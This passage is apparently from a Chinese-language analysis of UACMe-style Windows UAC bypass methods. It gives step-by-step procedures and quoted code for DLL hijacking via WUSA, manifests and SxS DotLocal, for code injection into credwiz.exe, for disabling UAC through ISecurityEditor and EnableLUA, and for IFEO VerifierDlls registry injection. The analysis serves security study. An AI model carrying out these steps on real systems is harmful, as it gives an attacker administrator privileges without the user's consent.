            ucmWusaCabinetCleanup();
        }
        return MethodResult;
    }
经过分析可以发现BypassUAC的流程为:
  1. 生成ellocnak.msu，此文件是一个cab格式的文件，内容为ntwdblib.dll文件（该文件为程序生成的加密Payload）,文件放置在用户临时目录下
  2. 通过之前介绍的WUSA将ellocnak.msu解压到system32目录下  
`cmd.exe /c wusa %temp%\ellocnak.msu /extract:%windir%\system32`
  3. 运行C:\windows\system32\cliconfg.exe，进行DLL劫持
该方法劫持了cliconfig.exe对ntwdblib.dll的加载。
跟进生成的payload,看一下具体怎么实现的bypassUAC:
payload是在_UCM_API_DISPATCH_ENTRY中PayloadResourceId字段指明的,但这个字段只是一个payload的资源标识符,真正处理的的部分在methods.c中的supLdrQueryResourceData函数,代码如下:
    Resource = supLdrQueryResourceData(
          Entry->PayloadResourceId,
          ImageBaseAddress,
          &DataSize);
supLdrQueryResourceData中的关键部分如下:
    if (DllHandle != NULL) {
            IdPath[0] = (ULONG_PTR)RT_RCDATA; //type
            IdPath[1] = ResourceId;           //id
            IdPath[2] = 0;                    //lang
            status = LdrFindResource_U(DllHandle, (ULONG_PTR*)&IdPath, 3, &DataEntry);
            if (NT_SUCCESS(status)) {
                status = LdrAccessResource(DllHandle, DataEntry, (PVOID*)&Data, &SizeOfData);
                if (NT_SUCCESS(status)) {
                    if (DataSize) {
                        *DataSize = SizeOfData;
                    }
                }
            }
        }
其中LdrFindResource_U和LdrAccessResource都是从NTdll中导出的API,LdrFindResource_U会根据资源ID找到相应的资源,如果找到,则返回相应的句柄,后续应该使用LdrAccessResource来使用该句柄,这两个API都没有找到有人分析的使用方法,但是可以跟进payload中,其拓展如下:
这里又可以在bin32res.rc中找到资源文件的路径,这里就是加密的payload的了,刚刚我们看到在定义IDPath时,第一项type值为RT_RCDATA,指明了该资源是由.rc文件中的RCDATA字段指出其位置的,可以看到就是bin/fubuki32.cd
我们接着在程序中寻找解密的算法,其解密算法在compress.c中的DecompressPayload函数中定义:
    PVOID DecompressPayload(
        _In_ ULONG PayloadId,
        _In_ PVOID pbBuffer,
        _In_ ULONG cbBuffer,
        _Out_ PULONG pcbDecompressed
    )
其对应的参数为:
`PayloadCode = g_ctx->DecompressRoutine(Entry->PayloadResourceId, Resource,
DataSize, &PayloadSize);`
Resource是加密的资源文件,在这里处理了加密过程
受篇幅所限,这里就不继续跟下去了,有兴趣的读者可以继续,其中密钥被放在了secrets.h中.这种方法就先说到这里
该项目中大部分Bypass UAC的方式都是这种DLL劫持的方法，只是劫持的DLL和EXE有所不同。
#####  使用manifest文件进行DLL劫持
利用manifest进行Bypass UAC的方式是微软在修复一次由DLL加载顺序劫持导致的Bypass UAC时自己暴露出来的一种Bypass
UAC的可行方案。
介绍一下manifest:
>
> XP以前版本的windows，执行EXE时会像之前介绍的顺序寻找相应的dll，Manifest只是个多余的文件或资源，dll文件会直接到system32的目录下查找，并且调用。  
>
> 而XP及其以后的操作系统，则会首先读取Manifest，获得exe文件需要调用的DLL列表（此时获得的，并不直接是DLL文件的本身的位置，而是DLL的manifest）操作系统再根据DLL的Manifest提供的信息去寻找对应的DLL
> ，这样就可能区别不同版本的同一个DLL文件。
在Windows中有些可执行程序没有内置的manifest，假设这个程序叫test.exe，如果攻击者在该可执行程序目录下新建一个test.exe.manifest并在manifest文件中指定file元素，则test.exe执行时会加载file元素中loadFrom属性指定的DLL（loadFrom的dll不能在KnownDlls中）
方法18就是采用这种方法,详情如下:
    Author: Leo Davidson derivative
        Type: Dll Hijack (Manifest)
        Method: IFileOperation
        Target(s): \system32\taskhost.exe, \system32\tzsync.exe (any ms exe without manifest)
        Component(s): Attacker defined
        Implementation: ucmAutoElevateManifest
        Works from: Windows 7 (7600)
        Fixed in: Windows 10 RS1 (14371)
            How: Manifest parsing logic reviewed
BypassUAC的过程如下(以win7版本为例)
  1. 先从C:\windows\system32下拷贝taskhost.exe到%temp%\临时目录下,再利用高权限进程把taskhost.exe拷贝到C:\windows下
  2. 在C:\windows\system32\sysprep下写一个cryptbase.dll(因为在C:\windows\system32\下本身存在cryptbase.dll，为了不影响系统功能，需要将攻击者自定义内容的cryptbase.dll拷贝到其他地方)并将payload注入到cryptbase.dll中
  3. 在C:\windows下写入taskhost.exe.manifest文件.由于taskhost.exe无内置清单文件，所以会从manifest中指定的路径加载DLL即C:\Windows\system32\sysprep\cryptbase.DLL（该DLL的名称可变，但file标签下name的值也需要相应变化,这个标签指明了taskhost.exe会自动加载的dll名称，即cryptbase.DLL）
我们看一下taskhost.exe.manifest的内容
    true
在这个方法中,还有一点值得一提,那就是怎么向系统目录中写文件而不触发UAC,在项目中,ucmMasqueradedMoveFileCOM这个函数提供了向特权目录写而不触发UAC的功能,其是通过借助IFileOperation
COM对象进行操作的.
IFileOperation
COM对象进行文件操作是可以自动提升权限(AutoElevate)(从标准用户到管理员用户)，但是它会检查当前使用该COM对象的进程是否为白名单进程，仅白名单进程的条件下可以进行自动权限提升。
在白名单进程中使用IFileOperation COM向受保护目录写文件时不会弹出UAC窗口。
#####  使用WinSxS机制进行DLL劫持
WinSxS位于%systemroot%\WinSxS,为windows XP
SP2后引入的一种机制,其中存放的是windows系统文件以及Dll文件的若干个副本,由于应用程序可以使用同一个DLL文件，因此出于兼容性与还原至旧版本的考虑，系统会在这里存放多个不同版本的文件副本。
SxS允许二进制文件嵌入manifest文件来表达详细的二进制依赖信息,当Windows公共控件包comctl32.dll被分裂为多个可以相互并存的版本以后该机制被使用，因而应用程序可以加载正确版本的二进制文件。此后其他的二进制文件也采用相同的方式进行版本管理。
C:\Windows\System32\sysprep\sysprep.exe的manifest文件如下，其中定义了dependency字段，这字段就是用来表达详细的二进制依赖信息的。
    ......
    ......
sysprep.exe在运行时会加载dependency设置的dll，比如name“Microsoft.Windows.Common-Controls”的对应的dll为comctl32.dll，sysprep.exe会加载C:\windwos\winsxs中的comctl32.dll，而不是加载system32下的dll。
但是在加载winsxs下的dll之前，windows会先应用Dotlocal机制去查找dll，这个机制也是MS推出的为了解决兼容性问题的一个机制，exe会首先检查当前目录下有没有sysprep.exe.local的文件夹，如果有则在该文件夹中寻找dll
    C:\Windows\System32\sysprep\sysprep.exe.local\amd64microsoft.windows.common-controls6595b64144ccf1df6.0.7601.18837none_fa3b1e3d17594757\comctl32.dll
若没有则会从winsxs下寻找dll
    C:\Windows\winsxs\amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.7601.18837_none_fa3b1e3d17594757\comctl32.dll
所以,我们bypassUAC的思路也就出来了:
  1. C:\windows\system32\sysprep\下新建文件夹sysprep.exe.local\amd64microsoft.windows.common-controls6595b64144ccf1df6.0.7601.18837none_fa3b1e3d17594757\
  2. 在该文件夹下写入comctl32.dll
  3. 运行sysprep.exe进行DLL劫持
对应21号方法:
    Author: Leo Davidson derivative
        Type: Dll Hijack
        Method: IFileOperation, SxS DotLocal
        Target(s): \system32\sysprep\sysprep.exe
        Component(s): comctl32.dll
        Implementation: ucmSXSMethod
        Works from: Windows 7 (7600)
        Fixed in: Windows 10 RS3 (16232)
            How: MitigationPolicy->ProcessImageLoadPolicy->PreferSystem32Images
当然也可以选择劫持其他程序
#####  通过代码注入绕过UAC
第14号方法使用了这种技术
    Author: Leo Davidson, WinNT/Sirefef derivative
        Type: Dll Hijack
        Method: IFileOperation
        Target(s): \system\credwiz.exe, \system32\wbem\oobe.exe
        Component(s): netutils.dll
        Implementation: ucmSirefefMethod
        Works from: Windows 7 (7600)
        Fixed in: Windows 10 TH2 (10548)
            How: AppInfo elevated application path control hardening
具体操作流程如下：
  1. 将payloadDll(Fubuki)使用IFileOperation拷贝C:\Windows\system32\wbem\netutils.dll
  2. 将C:\Windows\system32\credwiz.exe 拷贝到Temp目录下命名为oobe.exe
  3. 将Temp\oobe.exe使用IFileOperation拷贝到C:\Windows\system32\wbem\oobe.exe
  4. 启动credwiz.exe(以挂起模式CREATE_SUSPENDED启动)并向其进程注入shellcode(向credwiz中注入的代码是ucmxElevatedLaunchProc函数的代码)
  5. ucmElevatedLaunchProc中执行ShellExec (以runas方式执行)启动C:\Windows\system32\wbem\oobe.exe，该可执行程序存在DLL劫持，C:\Windows\system32\wbem\netutils.dll得以运行，进而绕过UAC
  6. 清理system32\wbem下的数据
其中ucmxElevatedLaunchProc的代码如下:
    DWORD WINAPI ucmxElevatedLaunchProc(
        _In_ LOAD_PARAMETERS *Params
    )
    {
        SHELLEXECUTEINFOW shexec;
        shexec.cbSize = sizeof(shexec);
        shexec.fMask = SEE_MASK_NOCLOSEPROCESS;
        shexec.nShow = SW_SHOW;
        shexec.lpVerb = Params->szVerb;
        shexec.lpFile = Params->szTargetApp;
        shexec.lpParameters = NULL;
        shexec.lpDirectory = NULL;
        if (Params->ShellExecuteExW(&shexec))
            if (shexec.hProcess != NULL) {
                Params->WaitForSingleObject(shexec.hProcess, INFINITE);
                Params->CloseHandle(shexec.hProcess);
            }
        return Params->RtlExitUserThread(STATUS_SUCCESS);
    }
其参数在
    RtlSecureZeroMemory(LoadParams, sizeof(LOAD_PARAMETERS));
            _strcpy(LoadParams->szVerb, RUNAS_VERB);
            _strcat(szB1, OOBE_EXE);
            _strncpy(LoadParams->szTargetApp, MAX_PATH, szB1, MAX_PATH);
            LoadParams->ShellExecuteExW = (pfnShellExecuteExW)GetProcAddress(
                g_ctx->hShell32,
                "ShellExecuteExW");
            LoadParams->WaitForSingleObject = (pfnWaitForSingleObject)GetProcAddress(
                g_ctx->hKernel32,
                "WaitForSingleObject");
            LoadParams->CloseHandle = (pfnCloseHandle)GetProcAddress(
                g_ctx->hKernel32,
                "CloseHandle");
            LoadParams->RtlExitUserThread = (pfnRtlExitUserThread)GetProcAddress(
                g_ctx->hNtdll,
                "RtlExitUserThread");
这里被构造,然后通过`Status = RtlCreateUserThread(hProcess, NULL, FALSE, 0, 0,
0,(PUSER_THREAD_START_ROUTINE)newEp, newDp,&hRemoteThread, NULL);` 传递过去
#####  关闭UAC机制
该方法第一次被使用是在一个叫Simda的恶意软件中。
这个方法有一个缺点，需要重启系统才能成功关闭UAC。
该方法利用微软没有公开的ISecurityEditor COM对象，该对象和IFileOperation
COM对象类似，是一个AutoElevate的COM对象，在白名单进程中使用可以自动提升权限。
这个对象可以用于修改注册表的访问权限，攻击者可以伪装白名单进程然后修改如下注册表权限为可写
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
然后设置EnableLUA为0 （EnableLUA REG_DWORD 0）即可关闭UAC。
5号方法用的就是这种手法:
    Author: WinNT/Simda
        Type: Elevated COM interface
        Method: ISecurityEditor
        Target(s): HKLM registry keys
        Component(s): -        Implementation: ucmSimdaTurnOffUac
        Works from: Windows 7 (7600)
        Fixed in: Windows 10 TH1 (10147)
            How: ISecurityEditor interface method changed
关键代码如下:
  1. 使用ISecurityEditor修改上述注册表权限为可写
  2. 新建/修改注册表键EnableUA的值为0
  3. 重启系统，成功关闭UAC
#####  使用注册表制定程序加载DLL
该方法同样使用ISecurityEditor
COM，修改的注册表项为，将其访问权限改为可写,然后在`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
NT\CurrentVersion\Image File Execution Options`表项后新建子项cliconfg.exe,在子项下增加键值对:
    GlobalFlag REG_DWORD 0x0000100   
    VerifierDlls REG_SZ Hibiki.dll
VerifierDlls的值为dll的名字，该dll为攻击者自定义dll，该DLL需要放置在C:\Windows\system32下。VerifierDlls中存储的DLL会被AppVerfier（应用程序检验器）使用。